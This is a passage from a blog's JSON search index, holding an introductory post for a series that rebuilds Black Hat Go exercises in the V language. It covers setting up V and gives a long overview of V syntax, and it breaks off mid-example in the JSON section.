
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2025-11-30","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/black_hat_v_intro/","summary":"\u003cp\u003eAfter brothing my first set of cybersecurity alphabet soup of certifications (yup, now I\u0026rsquo;ve hunt down OSCP for my HR peeps) I felt need to re-strategise my academic approach. Following is the first of many advents I have planned for myself. Throughout this and following posts (marked as Black Hat V), I\u0026rsquo;d try to reconstruct the exercises of \u003ca href=\"https://nostarch.com/blackhatgo\"\u003eBlack Hat Go (by Tom Steele, Chris Patten, and Dan Kottmann)\u003c/a\u003e to encourage myself to learn \u003ca href=\"https://vlang.io/\"\u003evlang\u003c/a\u003e.\u003c/p\u003e","tags":["programming"],"text":"after brothing my first set of cybersecurity alphabet soup of certifications (yup, now i\u0026rsquo;ve hunt down oscp for my hr peeps) i felt need to re-strategise my academic approach. following is the first of many advents i have planned for myself. throughout this and following posts (marked as black hat v), i\u0026rsquo;d try to reconstruct the exercises of black hat go (by tom steele, chris patten, and dan kottmann) to encourage myself to learn vlang.\nsetting up a development environment downloading and installing v visit vlang.io and download for your os. (i\u0026rsquo;d be using linux througout this series, if microsoft windows is need i\u0026rsquo;d leverage a vm).\nextract the zip archive downloaded. this would create a v directory with following contents. ./v can be used to launch a repl shell or compile/run .v source file.\nit is highly recommended, that you put v on your path. that saves you the effort to type in the full path to your v executable every time. v provides a convenience v symlink command to do that more easily.\non unix systems, it creates a /usr/local/bin/v symlink to your executable. to do that, run:\nsudo ./v symlink choosing an ide i configured microsoft visual studio code with extension for vlang.\nbreaking ice with v tool commands the v run command create a source file with .v extension (let\u0026rsquo;s say hello.v), with following code.\nfn main() { println(\u0026#39;hello world\u0026#39;) } from the command line, execute v run hello.v, you\u0026rsquo;d see the message printed back on screen.\nsimilar to golang, v run does not produce a compiled executable. to create a binary file just remove the run from the command.\nv hello.v this should create an executable (elf on linux, exe on windows) with same name as the source code file.\nto enable production mode optimizations while building, use -prod flag. this also helps to reduce the executable file size.\nv hello.v -prod cross-compilation to cross-compile the file, just pass the target os using -os flag.\nv hello.v -os windows the v install command to fetch third-party packages, use the v install command.\nthe v fmt command you don\u0026rsquo;t need to worry about formatting your code or setting style guidelines. v fmt takes care of that:\nv fmt file.v v playground it is an execution environment that provides a web-based interface to play with the language. try it here.\nthe v syntax for a thorough study of the language you can refer to v documentation. following is a brief overview of the syntax.\ndata types primitive data types the primitive data types include\nbool string i8, i16, int, i64 u8, u16, u32, u64 rune (represents a single utf-32 encoded unicode character and is an alias for u32. to denote them, use ` (backticks) ) f32, f64 isize, usize (platform dependent, the size of bytes it takes to reference any location in memory) voidptr (for interoperability with c) unlike c and go, int is always a 32 bit integer.\nthere is an exception to the rule that all operators in v must have values of the same type on both sides. a small primitive type on one side can be automatically promoted if it fits completely into the data range of the type on the other side. these are the allowed possibilities:\ni8 ‚Üí i16 ‚Üí int ‚Üí i64 ‚Üò ‚Üò f32 ‚Üí f64 ‚Üó ‚Üó u8 ‚Üí u16 ‚Üí u32 ‚Üí u64 ‚¨é ‚Üò ‚Üò ‚Üò ptr i8 ‚Üí i16 ‚Üí int ‚Üí i64 ‚¨è an int value for example can be automatically promoted to f64 or i64 but not to u32. (u32 would mean loss of the sign for negative values). promotion from int to f32, however, is currently done automatically (but can lead to precision loss for large values).\nliterals like 123 or 4.56 are treated in a special way. they do not lead to type promotions, however they default to int and f64 respectively, when their type has to be decided.\nu := u16(12) v := 13 + u // v is of type `u16` - no promotion x := f32(45.6) y := x + 3.14 // y is of type `f32` - no promotion a := 75 // a is of type `int` - default for int literal b := 14.7 // b is of type `f64` - default for float literal c := u + a // c is of type `int` - automatic promotion of `u`\u0026#39;s value d := b + x // d is of type `f64` - automatic promotion of `x`\u0026#39;s value strings in v, strings are encoded in utf-8, and are immutable (read-only) by default.\ns := \u0026#39;hello üåé\u0026#39; // the `world` emoji takes 4 bytes, and string length is reported in bytes assert s.len == 10 arr := s.bytes() // convert `string` to `[]u8` assert arr.len == 10 s2 := arr.bytestr() // convert `[]u8` to `string` assert s2 == s name := \u0026#39;bob\u0026#39; assert name.len == 3 // indexing gives a byte, u8(66) == `b` assert name[0] == u8(66) // slicing gives a string \u0026#39;ob\u0026#39; assert name[1..3] == \u0026#39;ob\u0026#39; // escape codes // escape special characters like in c windows_newline := \u0026#39;\\r\\n\u0026#39; assert windows_newline.len == 2 // arbitrary bytes can be directly specified using `\\x##` notation where `#` is // a hex digit aardvark_str := \u0026#39;\\x61ardvark\u0026#39; assert aardvark_str == \u0026#39;aardvark\u0026#39; assert \u0026#39;\\xc0\u0026#39;[0] == u8(0xc0) // or using octal escape `\\###` notation where `#` is an octal digit aardvark_str2 := \u0026#39;\\141ardvark\u0026#39; assert aardvark_str2 == \u0026#39;aardvark\u0026#39; // unicode can be specified directly as `\\u####` where # is a hex digit // and will be converted internally to its utf-8 representation star_str := \u0026#39;\\u2605\u0026#39; // ‚òÖ assert star_str == \u0026#39;‚òÖ\u0026#39; // utf-8 can be specified this way too, as individual bytes. assert star_str == \u0026#39;\\xe2\\x98\\x85\u0026#39; note that indexing a string normally will produce a u8 (byte), not a rune nor another string. indexes correspond to bytes in the string, not unicode code points. if you want to convert the u8 to a string, use the .ascii_str() method on the u8:\ncountry := \u0026#39;netherlands\u0026#39; println(country[0]) // output: 78 println(country[0].ascii_str()) // output: n however, you can easily get the runes for a string with the runes() method, which will return an array of the utf-8 characters from the string. you can then index this array. just be aware that there may be fewer indexes available on the rune array than on the bytes in the string, if there are any non-ascii characters.\nmut s := \u0026#39;hello üåé\u0026#39; // there are 10 bytes in the string (as shown earlier), but only 7 runes, since the `world` emoji // only counts as one `rune` (one unicode character) assert s.runes().len == 7 println(s.runes()[6]) prepend r for raw strings. escapes are not handled, so you will get exacly what you type:\ns := r\u0026#39;hello\\nworld\u0026#39; // the `\\n` will be preserved as two characters println(s) // \u0026#34;hello\\nworld\u0026#34; strings can be easily converted to integers:\ns := \u0026#39;42\u0026#39; n := s.int() // 42 // all int literals are supported assert \u0026#39;0xc3\u0026#39;.int() == 195 assert \u0026#39;0o10\u0026#39;.int() == 8 assert \u0026#39;0b1111_0000_1010\u0026#39;.int() == 3850 assert \u0026#39;-0b1111_0000_1010\u0026#39;.int() == -3850 string interpolation basic interpolation syntax is pretty simple - use ${ before a variable name and } after. the variable will be converted to a string and embedded into the literal:\nname := \u0026#39;bob\u0026#39; println(\u0026#39;hello, ${name}!\u0026#39;) // hello, bob! arrays v arrays are homogeneous (all elements must have the same type). this means that code like [1, 'a'] will not compile. the type of an array is determined by the first element:\n[1, 2, 3] is an array of ints ([]int). ['a', 'b'] is an array of strings ([]string). the user can explicitly specify the type for the first element: [u8(16), 32, 64, 128].\nan element can be appended to the end of an array using the push operator \u0026laquo;. it can also append an entire array.\nmut nums := [10, 20, 30] println(nums) // `[10, 20, 30]` mut nums := [1, 2, 3] nums \u0026lt;\u0026lt; 4 println(nums) // \u0026#34;[1, 2, 3, 4]\u0026#34; // append array nums \u0026lt;\u0026lt; [5, 6, 7] println(nums) // \u0026#34;[1, 2, 3, 4, 5, 6, 7]\u0026#34; // declare an empty array: users := []int{} the above syntax is fine for a small number of known elements but for very large or empty arrays there is a second initialization syntax:\nmut a := []int{len: 10000, cap: 30000, init: 3} this creates an array of 10000 int elements that are all initialized with 3. memory space is reserved for 30000 elements. the parameters len, cap and init are optional; len defaults to 0 and init to the default initialization of the element type (0 for numerical type, '' for string, etc). the run time system makes sure that the capacity is not smaller than len (even if a smaller value is specified explicitly).\nthere are two fields that control the \u0026ldquo;size\u0026rdquo; of an array:\nlen: length - the number of pre-allocated and initialized elements in the array cap: capacity - the amount of memory space which has been reserved for elements, but not initialized or counted as elements. the array can grow up to this size without being reallocated. usually, v takes care of this field automatically but there are cases where the user may want to do manual optimizations. mut nums := [1, 2, 3] println(nums.len) // \u0026#34;3\u0026#34; println(nums.cap) // \u0026#34;3\u0026#34; or greater arr := []int{len: 5, init: -1} // `arr == [-1, -1, -1, -1, -1]`, arr.cap == 5 you can initialize the array by accessing the index variable which gives the index as shown here:\ncount := []int{len: 4, init: index} assert count == [0, 1, 2, 3] mut square := []int{len: 6, init: index * index} // square == [0, 1, 4, 9, 16, 25] you can learn more about different array types here.\nmulti-dimensional arrays arrays can have more than one dimension.\n2d array example:\nmut a := [][]int{len: 2, init: []int{len: 3}} a[0][1] = 2 println(a) // [[0, 2, 0], [0, 0, 0]] 3d array example:\nmut a := [][][]int{len: 2, init: [][]int{len: 3, init: []int{len: 2}}} a[0][1][1] = 2 println(a) // [[[0, 0], [0, 2], [0, 0]], [[0, 0], [0, 0], [0, 0]]] fixed size arays v also supports arrays with fixed size. unlike ordinary arrays, their length is constant. you cannot append elements to them, nor shrink them. you can only modify their elements in place.\nhowever, access to the elements of fixed size arrays is more efficient, they need less memory than ordinary arrays, and unlike ordinary arrays, their data is on the stack, so you may want to use them as buffers if you do not want additional heap allocations.\nmost methods are defined to work on ordinary arrays, not on fixed size arrays. you can convert a fixed size array to an ordinary array with slicing:\nmut fnums := [3]int{} // fnums is a fixed size array with 3 elements. fnums[0] = 1 fnums[1] = 10 fnums[2] = 100 println(fnums) // =\u0026gt; [1, 10, 100] println(typeof(fnums).name) // =\u0026gt; [3]int fnums2 := [1, 10, 100]! // short init syntax that does the same (the syntax will probably change) anums := fnums[..] // same as `anums := fnums[0..fnums.len]` println(anums) // =\u0026gt; [1, 10, 100] println(typeof(anums).name) // =\u0026gt; []int maps mut m := map[string]int{} // a map with `string` keys and `int` values m[\u0026#39;one\u0026#39;] = 1 m[\u0026#39;two\u0026#39;] = 2 println(m[\u0026#39;one\u0026#39;]) // \u0026#34;1\u0026#34; println(m[\u0026#39;bad_key\u0026#39;]) // \u0026#34;0\u0026#34; println(\u0026#39;bad_key\u0026#39; in m) // use `in` to detect whether such key exists println(m.keys()) // [\u0026#39;one\u0026#39;, \u0026#39;two\u0026#39;] m.delete(\u0026#39;two\u0026#39;) maps can have keys of type string, rune, integer, float or voidptr.\nthe whole map can be initialized using this short syntax:\nnumbers := { \u0026#39;one\u0026#39;: 1 \u0026#39;two\u0026#39;: 2 } println(numbers) if a key is not found, a zero value is returned by default:\nsm := { \u0026#39;abc\u0026#39;: \u0026#39;xyz\u0026#39; } val := sm[\u0026#39;bad_key\u0026#39;] println(val) // \u0026#39;\u0026#39; it\u0026rsquo;s also possible to use an or {} block to handle missing keys:\nmm := map[string]int{} val := mm[\u0026#39;bad_key\u0026#39;] or { panic(\u0026#39;key not found\u0026#39;) } map update syntax v lets you initialise a map with an update applied on top of another map:\nconst base_map = { \u0026#39;a\u0026#39;: 4 \u0026#39;b\u0026#39;: 5 } foo := { ...base_map \u0026#39;b\u0026#39;: 88 \u0026#39;c\u0026#39;: 99 } println(foo) // {\u0026#39;a\u0026#39;: 4, \u0026#39;b\u0026#39;: 88, \u0026#39;c\u0026#39;: 99} structs structs can help design user-defined complex data types.\nstruct point { x int y int } mut p := point{ x: 10 y: 20 } println(p.x) // struct fields are accessed using a dot // alternative literal syntax p = point{10, 20} assert p.x == 10 structs are allocated on the stack. to allocate a struct on the heap and get a reference to it, use the \u0026amp; prefix:\nstruct point { x int y int } p := \u0026amp;point{10, 10} // references have the same syntax for accessing fields println(p.x) the type of p is \u0026amp;point. it\u0026rsquo;s a reference to point. references are similar to go pointers and c++ references.\nstruct foo { mut: x int } fa := foo{1} mut a := fa a.x = 2 assert fa.x == 1 assert a.x == 2 // fb := foo{ 1 } // mut b := \u0026amp;fb // error: `fb` is immutable, cannot have a mutable reference to it // b.x = 2 mut fc := foo{1} mut c := \u0026amp;fc c.x = 2 assert fc.x == 2 assert c.x == 2 println(fc) // foo{ x: 2 } println(c) // \u0026amp;foo{ x: 2 } // note `\u0026amp;` prefixed. default field values can be assigned during struct definition.\nstruct foo { n int // n is 0 by default s string // s is \u0026#39;\u0026#39; by default a []int // a is `[]int{}` by default pos int = -1 // custom default value } all struct fields are zeroed by default during the creation of the struct. array and map fields are allocated. in case of reference value, see here.\nyou can mark a struct field with the [required] attribute, to tell v that that field must be initialized when creating an instance of that struct.\nstruct foo { n int @[required] } struct access modifiers struct fields are private and immutable by default (making structs immutable as well). their access modifiers can be changed with pub and mut. in total, there are 5 possible options:\nstruct foo { a int // private immutable (default) mut: b int // private mutable c int // (you can list multiple fields with the same access modifier) pub: d int // public immutable (readonly) pub mut: e int // public, but mutable only in parent module __global: // (not recommended to use, that\u0026#39;s why the \u0026#39;global\u0026#39; keyword starts with __) f int // public and mutable both inside and outside parent module } methods for structs v doesn\u0026rsquo;t have classes, but you can define methods on types. a method is a function with a special receiver argument. the receiver appears in its own argument list between the fn keyword and the method name. methods must be in the same module as the receiver type.\nstruct user { age int } fn (u user) can_register() bool { return u.age \u0026gt; 16 } user := user{ age: 10 } println(user.can_register()) // \u0026#34;false\u0026#34; user2 := user{ age: 20 } println(user2.can_register()) // \u0026#34;true\u0026#34; in this example, the can_register method has a receiver of type user named u. the convention is not to use receiver names like self or this, but a short, preferably one letter long, name.\nstatic type methods for structs v supports static type methods like user.new(). these are defined on a struct via fn [type name].[function name] and allow to organize all functions related to a struct:\nstruct user {} fn user.new() user { return user{} } user := user.new() interfaces an interface can be considered as a blueprint that defines an expected set of actions that any concrete implementation must fulfill in order to be considered a type of that interface. unlike go, but like typescript, v\u0026rsquo;s interfaces can define both fields and methods.\ninterface speaker { breed string speak() string } a type implements an interface by implementing its methods and fields. in the following code, both dog and cat struct have a breed attribute and a speak() method which allows them to adhere to requirements to be considered as a speaker type.\nstruct dog { breed string } fn (d dog) speak() string { return \u0026#39;woof\u0026#39; } struct cat { breed string } fn (c cat) speak() string { return \u0026#39;meow\u0026#39; } fn main() { dog := dog{\u0026#39;leonberger\u0026#39;} cat := cat{\u0026#39;siamese\u0026#39;} mut arr := []speaker{} arr \u0026lt;\u0026lt; dog arr \u0026lt;\u0026lt; cat for item in arr { println(\u0026#39;a ${item.breed} says: ${item.speak()}\u0026#39;) } } to learn more about interfaces, you can reference this documentation.\ncontrol structures if if statements are pretty straightforward and similar to most other languages. unlike other c-like languages, there are no parentheses surrounding the condition and the braces are always required.\na := 10 b := 20 if a \u0026lt; b { println(\u0026#39;${a} \u0026lt; ${b}\u0026#39;) } else if a \u0026gt; b { println(\u0026#39;${a} \u0026gt; ${b}\u0026#39;) } else { println(\u0026#39;${a} == ${b}\u0026#39;) } if expressions unlike c, v does not have a ternary operator, that would allow you to do: x = c ? 1 : 2 . instead, it has a bit more verbose, but also clearer to read, ability to use if as an expression. the direct translation in v of the ternary construct above, assuming c is a boolean condition, would be: x = if c { 1 } else { 2 }.\nyou can use multiple statements in each of the branches of an if expression, followed by a final value, that will become the value of the entire if expression, when it takes that branch:\nn := arguments().len x := if n \u0026gt; 2 { dump(arguments()) 42 } else { println(\u0026#39;something else\u0026#39;) 100 } dump(x) match a match statement is a shorter way to write a sequence of if - else statements. when a matching branch is found, the following statement block will be run. the else branch will be run when no other branches match.\nos := \u0026#39;windows\u0026#39; print(\u0026#39;v is running on \u0026#39;) match os { \u0026#39;darwin\u0026#39; { println(\u0026#39;macos.\u0026#39;) } \u0026#39;linux\u0026#39; { println(\u0026#39;linux.\u0026#39;) } else { println(os) } } number := 2 s := match number { 1 { \u0026#39;one\u0026#39; } 2 { \u0026#39;two\u0026#39; } else { \u0026#39;many\u0026#39; } } in operator in allows to check whether an array or a map contains an element. to do the opposite, use !in.\nnums := [1, 2, 3] println(1 in nums) // true println(4 !in nums) // true for loops v has only one looping keyword: for, with several forms.\nfor/in is the most common form. you can use it with an array, map or numeric range. the for value in arr form is used for going through elements of an array. if an index is required, an alternative form for index, value in arr can be used.\nnumbers := [1, 2, 3, 4, 5] for num in numbers { println(num) } names := [\u0026#39;sam\u0026#39;, \u0026#39;peter\u0026#39;] for i, name in names { println(\u0026#39;${i}) ${name}\u0026#39;) // output: 0) sam // 1) peter } note that the value is read-only. if you need to modify the array while looping, you need to declare the element as mutable:\nmut numbers := [0, 1, 2] for mut num in numbers { num++ } println(numbers) // [1, 2, 3] by default, array elements are taken by value, if you need elements to be taken by reference, use \u0026amp; on the array you want to iterate over:\nstruct user { name string } users := [user{ name: \u0026#39;someuserwow99\u0026#39; }, user{ name: \u0026#39;visgod\u0026#39; }] // note `\u0026amp;users`, this is how a reference to the elements of the array is received for user in \u0026amp;users { // some operations with `user` } the same applies to maps.\nwhen an identifier is just a single underscore, it is ignored.\nm := { \u0026#39;one\u0026#39;: 1 \u0026#39;two\u0026#39;: 2 } for key, value in m { println(\u0026#39;${key} -\u0026gt; ${value}\u0026#39;) // output: one -\u0026gt; 1 // two -\u0026gt; 2 } // iterate over keys for key, _ in m { println(key) // output: one // two } // iterate over values for _, value in m { println(value) // output: 1 // 2 } while executing a ranged for, low..high means an exclusive range, which represents all values from low up to but not including high.\n// prints \u0026#39;01234\u0026#39; for i in 0 .. 5 { print(i) } a conditional for is of the forms\nmut sum := 0 mut i := 0 for i \u0026lt;= 100 { sum += i i++ } println(sum) // \u0026#34;5050\u0026#34; this form of the loop is similar to while loops in other languages. the loop will stop iterating once the boolean condition evaluates to false. again, there are no parentheses surrounding the condition, and the braces are always required.\nfinally, there\u0026rsquo;s the traditional c style for loop. it\u0026rsquo;s safer than the while form because with the latter it\u0026rsquo;s easy to forget to update the counter and get stuck in an infinite loop.\nhere i doesn\u0026rsquo;t need to be declared with mut since it\u0026rsquo;s always going to be mutable by definition.\nfor i := 0; i \u0026lt; 10; i += 2 { // don\u0026#39;t print 6 if i == 6 { continue } println(i) } v also supports custom iterators.\ndefer a defer {} statement, defers the execution of the block of statements until the surrounding scope of the defer ends. it is a convenient feature that allows you to group related actions (getting access to a resource and cleaning/freeing it after you are done) closely together, instead of spreading them across multiple potentially very remote lines of code.\nimport os fn read_log() ! { mut ok := false mut f := os.open(\u0026#39;log.txt\u0026#39;)! defer { f.close() } // ... if !ok { // ... // defer statement will be called here, the file will be closed return } // ... // defer statement will be called here too, the file will be closed } if the function returns a value the defer block is executed after the return expression is evaluated.\nconcurrency v\u0026rsquo;s model of concurrency is similar to go\u0026rsquo;s.\ngo foo() runs foo() concurrently in a lightweight thread managed by the v runtime.\nspawn foo() runs foo() concurrently in a different thread:\nimport math fn p(a f64, b f64) { // ordinary function without return value c := math.sqrt(a * a + b * b) println(c) } fn main() { spawn p(3, 4) // p will be run in parallel thread // it can also be written as follows // spawn fn (a f64, b f64) { // c := math.sqrt(a * a + b * b) // println(c) // }(3, 4) } threads rely on the machine\u0026rsquo;s cpu (number of cores/threads). be aware that os threads spawned with spawn have limitations in regard to concurrency, including resource overhead and scalability issues, and might affect performance in cases of high thread count.\nsometimes it is necessary to wait until a parallel thread has finished. this can be done by assigning a handle to the started thread and calling the wait() method to this handle later:\nimport math fn p(a f64, b f64) { // ordinary function without return value c := math.sqrt(a * a + b * b) println(c) // prints `5` } fn main() { h := spawn p(3, 4) // p() runs in parallel thread h.wait() // p() has definitely finished } this approach can also be used to get a return value from a function that is run in a parallel thread. there is no need to modify the function itself to be able to call it concurrently.\nimport math { sqrt } fn get_hypot(a f64, b f64) f64 { // ordinary function returning a value c := sqrt(a * a + b * b) return c } fn main() { g := spawn get_hypot(54.06, 2.08) // spawn thread and get handle to it h1 := get_hypot(2.32, 16.74) // do some other calculation here h2 := g.wait() // get result from spawned thread println(\u0026#39;results: ${h1}, ${h2}\u0026#39;) // prints `results: 16.9, 54.1` } if there is a large number of tasks, it might be easier to manage them using an array of threads.\nimport time fn task(id int, duration int) { println(\u0026#39;task ${id} begin\u0026#39;) time.sleep(duration * time.millisecond) println(\u0026#39;task ${id} end\u0026#39;) } fn main() { mut threads := []thread{} threads \u0026lt;\u0026lt; spawn task(1, 500) threads \u0026lt;\u0026lt; spawn task(2, 900) threads \u0026lt;\u0026lt; spawn task(3, 100) threads.wait() println(\u0026#39;done\u0026#39;) } // output: // task 1 begin // task 2 begin // task 3 begin // task 3 end // task 1 end // task 2 end // done additionally for threads that return the same type, calling wait() on the thread array will return all computed values.\nfn expensive_computing(i int) int { return i * i } fn main() { mut threads := []thread int{} for i in 1 .. 10 { threads \u0026lt;\u0026lt; spawn expensive_computing(i) } // join all tasks r := threads.wait() println(\u0026#39;all jobs finished: ${r}\u0026#39;) } // output: all jobs finished: [1, 4, 9, 16, 25, 36, 49, 64, 81] concurrency: communicating over channels channels are the preferred way to communicate between threads. they allow threads to exchange data safely without requiring explicit locking. v\u0026rsquo;s channels are similar to those in go, enabling you to push objects into a channel on one end and pop objects from the other. channels can be buffered or unbuffered, and you can use the select statement to monitor multiple channels simultaneously.\nchannels are declared with the type chan objtype. you can optionally specify a buffer length using the cap field:\nch := chan int{} // unbuffered - \u0026#34;synchronous\u0026#34; ch2 := chan f64{cap: 100} // buffered with a capacity of 100 you can define channels of various types, depending on the type of data you intend to pass via the channel (int, f64 in the example above).\nchannels do not have to be declared as mut. the buffer length is not part of the type but a field of the individual channel object. channels can be passed to threads like normal variables:\nimport time fn worker(ch chan int) { for i in 0 .. 5 { ch \u0026lt;- i // push values into the channel } } fn clock(ch chan int) { for i in 0 .. 5 { time.sleep(1 * time.second) println(\u0026#39;clock tick\u0026#39;) ch \u0026lt;- (i + 1000) // push a value into the channel } ch.close() // close the channel when done } fn main() { ch := chan int{cap: 5} spawn worker(ch) spawn clock(ch) for { value := \u0026lt;-ch or { // receive/pop values from the channel println(\u0026#39;channel closed\u0026#39;) break } println(\u0026#39;received: ${value}\u0026#39;) } } buffered channels allow you to push multiple items without blocking, as long as the buffer is not full:\nch := chan string{cap: 2} ch \u0026lt;- \u0026#39;hello\u0026#39; ch \u0026lt;- \u0026#39;world\u0026#39; // ch \u0026lt;- \u0026#39;!\u0026#39; // this would block because the buffer is full println(\u0026lt;-ch) // \u0026#34;hello\u0026#34; println(\u0026lt;-ch) // \u0026#34;world\u0026#34; a channel can be closed to indicate that no further objects can be pushed. any attempt to do so will then result in a runtime panic (with the exception of select and try_push() - see below). attempts to pop will return immediately if the associated channel has been closed and the buffer is empty. this situation can be handled using an or {} block.\nch := chan int{} ch2 := chan f64{} // ... ch.close() // ... m := \u0026lt;-ch or { println(\u0026#39;channel has been closed\u0026#39;) } // propagate error y := \u0026lt;-ch2 ? channel select the select command allows monitoring several channels at the same time without noticeable cpu load. it consists of a list of possible transfers and associated branches of statements - similar to the match command:\nimport time fn main() { ch := chan f64{} ch2 := chan f64{} ch3 := chan f64{} mut b := 0.0 c := 1.0 // ... setup spawn threads that will send on ch/ch2 spawn fn (the_channel chan f64) { time.sleep(5 * time.millisecond) the_channel \u0026lt;- 1.0 }(ch) spawn fn (the_channel chan f64) { time.sleep(1 * time.millisecond) the_channel \u0026lt;- 1.0 }(ch2) spawn fn (the_channel chan f64) { _ := \u0026lt;-the_channel }(ch3) select { a := \u0026lt;-ch { // do something with `a` eprintln(\u0026#39;\u0026gt; a: ${a}\u0026#39;) } b = \u0026lt;-ch2 { // do something with predeclared variable `b` eprintln(\u0026#39;\u0026gt; b: ${b}\u0026#39;) } ch3 \u0026lt;- c { // do something if `c` was sent time.sleep(5 * time.millisecond) eprintln(\u0026#39;\u0026gt; c: ${c} was send on channel ch3\u0026#39;) } 500 * time.millisecond { // do something if no channel has become ready within 0.5s eprintln(\u0026#39;\u0026gt; more than 0.5s passed without a channel being ready\u0026#39;) } } eprintln(\u0026#39;\u0026gt; done\u0026#39;) } the timeout branch is optional. if it is absent select waits for an unlimited amount of time. it is also possible to proceed immediately if no channel is ready in the moment select is called by adding an else { ... } branch. else and \u0026lt;timeout\u0026gt; are mutually exclusive.\nthe select command can be used as an expression of type bool that becomes false if all channels are closed:\nif select { ch \u0026lt;- a { // ... } } { // channel was open } else { // channel is closed } for special purposes there are some builtin fields and methods:\nch := chan int{cap: 2} // try to perfomr ch \u0026lt;- 42 println(ch.try_push(42)) // `success` if pushed, `not_ready` if full, `closed` if closed println(ch.len) // number of items in the buffer println(ch.cap) // buffer capacity println(ch.closed) // whether the channel is closed the try_push/pop() methods will return immediately with one of the results success, not_ready or closed - dependent on whether the object has been transferred or the reason why not. usage of these methods and fields in production is not recommended - algorithms based on them are often subject to race conditions. especially .len and .closed should not be used to make decisions. use or branches, error propagation or select instead.\nconcurrency: shared objects data can be exchanged between a thread and the calling thread via a shared variable. such variables should be created as shared and passed to the thread as such, too. the underlying struct contains a hidden mutex that allows locking concurrent access using rlock for read-only and lock for read/write access.\nnote: shared variables must be structs, arrays or maps.\nstruct counter { mut: value int } fn (shared counter counter) increment() { lock counter { counter.value += 1 println(\u0026#39;incremented to: ${counter.value}\u0026#39;) } } fn main() { shared counter := counter{} spawn counter.increment() spawn counter.increment() rlock counter { println(\u0026#39;final value: ${counter.value}\u0026#39;) } } difference between channels and shared objects purpose:\nchannels: used for message passing between threads, ensuring safe communication. shared objects: used for direct data sharing and modification between threads. synchronization:\nchannels: implicit (via channel operations) shared objects: explicit (via rlock/lock blocks) option/result types and error handling option types can represent a value or none. result types may represent a value, or an error returned from a function.\noption types are declared by prepending ? to the type name: ?type. result types use !: !type.\nstruct user { id int name string } struct repo { users []user } fn (r repo) find_user_by_id(id int) !user { for user in r.users { if user.id == id { // v automatically wraps this into a result or option type return user } } return error(\u0026#39;user ${id} not found\u0026#39;) } // a version of the function using an option fn (r repo) find_user_by_id2(id int) ?user { for user in r.users { if user.id == id { return user } } return none } fn main() { repo := repo{ users: [user{1, \u0026#39;andrew\u0026#39;}, user{2, \u0026#39;bob\u0026#39;}, user{10, \u0026#39;charles\u0026#39;}] } user := repo.find_user_by_id(10) or { // option/result types must be handled by `or` blocks println(err) return } println(user.id) // \u0026#34;10\u0026#34; println(user.name) // \u0026#34;charles\u0026#34; user2 := repo.find_user_by_id2(10) or { return } // to create an option var directly: my_optional_int := ?int(none) my_optional_string := ?string(none) my_optional_user := ?user(none) } the amount of work required to \u0026ldquo;upgrade\u0026rdquo; a function to an option/result function is minimal; you have to add a ? or ! to the return type and return none or an error (respectively) when something goes wrong.\nthis is the primary mechanism for error handling in v. they are still values, like in go, but the advantage is that errors can\u0026rsquo;t be unhandled, and handling them is a lot less verbose. unlike other languages, v does not handle exceptions with throw/try/catch blocks.\nerr is defined inside an or block and is set to the string message passed to the error() function.\nuser := repo.find_user_by_id(7) or { println(err) // \u0026#34;user 7 not found\u0026#34; return } use err is ... to compare errors:\nimport io x := read() or { if err is io.eof { println(\u0026#39;end of file\u0026#39;) } return } only one option or result is allowed to be returned from a function. it is possible to return multiple values and still signal an error.\nfn multi_return(v int) !(int, int) { if v \u0026lt; 0 { return error(\u0026#39;must be positive\u0026#39;) } return v, v * v } handling options/results there are four ways of handling an option/result.\nthe first method is to propagate the error: import net.http fn f(url string) !string { resp := http.get(url)! return resp.body } the body of f is essentially a condensed version of:\nresp := http.get(url) or { return err } return resp.body http.get returns !http.response. because ! follows the call, the error will be propagated to the caller of f. when using ? after a function call producing an option, the enclosing function must return an option as well. if error propagation is used in the main() function it will panic instead, since the error cannot be propagated any further.\nthe second method is to break from execution early: user := repo.find_user_by_id(7) or { return } here, you can either call panic() or exit(), which will stop the execution of the entire program, or use a control flow statement (return, break, continue, etc) to break from the current block.\nbreak and continue can only be used inside a for loop.\nthe third method is to provide a default value at the end of the or block. in case of an error, that value would be assigned instead, so it must have the same type as the content of the option being handled. fn do_something(s string) !string { if s == \u0026#39;foo\u0026#39; { return \u0026#39;foo\u0026#39; } return error(\u0026#39;invalid string\u0026#39;) } a := do_something(\u0026#39;foo\u0026#39;) or { \u0026#39;default\u0026#39; } // a will be \u0026#39;foo\u0026#39; b := do_something(\u0026#39;bar\u0026#39;) or { \u0026#39;default\u0026#39; } // b will be \u0026#39;default\u0026#39; println(a) println(b) the fourth method is to use if unwrapping: import net.http if resp := http.get(\u0026#39;https://google.com\u0026#39;) { println(resp.body) // resp is a http.response, not an option } else { println(err) } above, http.get returns a !http.response. resp is only in scope for the first if branch. err is only in scope for the else branch.\ncustom error types v gives you the ability to define custom error types through the ierror interface. the interface requires two methods: msg() string and code() int. every type that implements these methods can be used as an error.\nwhen defining a custom error type it is recommended to embed the builtin error default implementation. this provides an empty default implementation for both required methods, so you only have to implement what you really need, and may provide additional utility functions in the future.\nstruct patherror { error path string } fn (err patherror) msg() string { return \u0026#39;failed to open path: ${err.path}\u0026#39; } fn try_open(path string) ! { // v automatically casts this to ierror return patherror{ path: path } } fn main() { try_open(\u0026#39;/tmp\u0026#39;) or { panic(err) } } json json\nbecause of the ubiquitous nature of json, support for it is built directly into v.\nv generates code for json encoding and decoding. no runtime reflection is used. this results in much better performance.\ndecoding json the json.decode function takes two arguments: the first is the type into which the json value should be decoded and the second is a string containing the json data.\nimport json struct foo { x int } struct user { // adding a [required] attribute will make decoding fail, if that // field is not present in the input. // if a field is not [required], but is missing, it will be assumed // to have its default value, like 0 for numbers, or \u0026#39;\u0026#39; for strings, // and decoding will not fail. name string @[required] age int // use the `@[skip]` attribute to skip certain fields. // you can also use `@[json: \u0026#39;-\u0026#39;]`, and `@[sql: \u0026#39;-\u0026#39;]`, which will cause only // the `json` module to skip the field, or only the sql orm to skip it. foo foo @[skip] // if the field name is different in json, it can be specified last_name string @[json: lastname] } data := \u0026#39;{ \u0026#34;name\u0026#34;: \u0026#34;frodo\u0026#34;, \u0026#34;lastname\u0026#34;: \u0026#34;baggins\u0026#34;, \u0026#34;age\u0026#34;: 25, \u0026#34;nullable\u0026#34;: null }\u0026#39; user := json.decode(user, data) or { eprintln(\u0026#39;failed to decode json, error: ${err}\u0026#39;) return } println(user.name) println(user.last_name) println(user.age) // you can also decode json arrays: sfoos := 